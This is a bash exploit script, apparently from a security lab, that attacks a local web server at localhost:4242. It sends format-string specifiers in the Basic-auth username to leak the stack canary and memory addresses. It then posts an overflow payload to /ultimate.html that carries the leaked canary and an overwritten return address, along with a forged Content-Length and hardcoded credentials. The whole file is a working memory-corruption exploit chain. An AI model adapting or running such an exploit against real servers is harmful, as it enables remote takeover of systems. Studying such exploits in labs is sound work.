#!/bin/bash

OUT=$(curl -vs -u "%27$.8x %30$.8x %31$.8x":a localhost:4242 --stderr /dev/stdout | grep WWW-Authenticate)
# OUT=$(curl -vs -u "%27$.8x %30$.8x %31$.8x":a 127.0.0.1:8000 --stderr /dev/stdout | grep WWW-Authenticate)
CANARY=$(echo $OUT | awk '{print $6}')
BUFFER=$(echo $OUT | awk '{print $7}')
ADDRESS=$(echo $OUT | awk '{print $8}' | head -c 8)

# echo $CANARY $BUFFER $ADDRESS

BUFFER="0x"$BUFFER
ADDRESS="0x"$ADDRESS

BUFFER=$(printf 0x%x $(($BUFFER - $3)))
ADDRESS=$(printf 0x%x $(($ADDRESS + $4)))
# ADDRESS="0x5663a865"

#echo $CANARY $BUFFER $ADDRESS

BUFFER_INV=$(python3 hexhelp.py $BUFFER)
CANARY_INV=$(python3 hexhelp.py $CANARY)
ADDRESS_INV=$(python3 hexhelp.py $ADDRESS)

A=$(yes A | head -$1 | tr -d "\n")
CONLEN=$2
# echo "CONLEN" $CONLEN
#echo "RET_ADDR OFFSET $4"

PAYLOAD="
0x41 0x41 0x41 0x41
0x41 0x41 0x41 0x41
0x41 0x41 0x41 0x41
0x41 0x41 0x41 0x41
0x41 0x41 0x41 0x41
0x41 0x41 0x41 0x41
0x41 0x41 0x41 0x41
$BUFFER_INV
0x41 0x41 0x41 0x41
0x41 0x41 0x41 0x41
0x41 0x41 0x41 0x41
0x41 0x41 0x41 0x41
0x41 0x41 0x41 0x41
$BUFFER_INV
0x41 0x41 0x41 0x41
$CANARY_INV
0x41 0x41 0x41 0x41
0x41 0x41 0x41 0x41
0x41 0x41 0x41 0x41
$ADDRESS_INV"

PAYLOADHEX=$A$(echo $PAYLOAD | xxd -r -p)

# read -p "Payload ready" 

curl localhost:4242/ultimate.html -m 5 --data-raw $PAYLOADHEX -H "Content-Length:$CONLEN" -H "Authorization: Basic YWRtaW46Ym9iJ3MgeW91ciB1bmNsZQ==" 
# curl -vs 127.0.0.1:8000/ultimate.html --data-raw $PAYLOADHEX -H "Content-Length:$CONLEN" -H "Authorization: Basic YWRtaW46aGVsbG8xMjM=" 